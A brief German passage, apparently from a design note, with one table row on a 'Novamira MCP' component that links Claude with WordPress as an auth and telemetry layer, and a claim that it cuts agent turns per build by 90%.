| Novamira MCP | Vermittelt zwischen Claude und WP | Wird zur Auth-Schicht + Telemetrie (Build-Logs, Performance-Metriken) |

Das spart 90% der Agent-Turns (1 Turn pro Build statt 18+).
